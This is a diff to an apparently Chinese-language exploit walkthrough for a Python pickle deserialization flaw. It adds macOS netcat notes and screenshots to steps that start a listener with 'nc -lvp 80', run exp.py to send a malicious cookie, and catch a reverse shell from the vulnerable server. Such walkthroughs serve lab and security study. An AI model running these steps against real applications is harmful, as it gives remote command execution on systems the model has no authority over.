@@ -52,16 +52,23 @@ class exp(object):
 
 要执行此利用，首先在您的机器上设置netcat监听器以接收反向shell：
 
-```
+```bash
 nc -lvp 80
+
+# 在 Mac 上，因为 macOS 自带的是 BSD 版本的 netcat，而不是 GNU 版本，所以一些参数可能不兼容，你只需要
+nc -lv 80
 ```
 
 然后运行利用脚本，将恶意cookie发送到存在漏洞的应用程序：
 
-```
+```bash
 python3 exp.py
 ```
 
 当服务器反序列化恶意pickle对象时，它将执行命令并建立与您机器的反向shell连接：
 
 ![反向Shell演示](1.png)
+
+在 Mac 上测试的结果：
+
+![Mac上反向Shell演示](mac.png)
